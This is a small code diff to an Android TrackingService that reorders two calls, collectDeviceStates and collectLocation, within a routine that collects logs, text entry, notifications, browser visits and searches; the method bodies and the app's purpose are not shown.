@@ -95,14 +95,16 @@ public class TrackingService extends Service {
         Logging.debug("Collecting Data..");
 
         collectLogs();
-        collectDeviceStates();
-        collectLocation();
         collectTextEntry();
         collectUIAction();
         collectNotifications();
         collectBrowserVisits();
         collectBrowserSearch();
         collectDeviceEvent();
+        collectDeviceStates();
+        collectLocation();
+
+
     }
 
     public int onStartCommand(Intent intent, int flags, int startId) {
